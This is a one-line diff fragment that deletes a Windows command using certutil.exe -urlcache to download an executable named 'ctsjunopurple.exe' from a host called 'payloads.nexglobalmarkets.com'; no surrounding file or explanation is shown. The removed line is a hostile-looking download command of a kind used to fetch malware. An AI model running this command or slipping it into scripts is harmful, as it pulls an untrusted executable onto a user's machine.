@@ -1,1 +1,0 @@
-$NULL=certutil.exe -urlcache -f https://payloads.nexglobalmarkets.com/site/ctsjunopurple.exe ctsjunopurple.exe
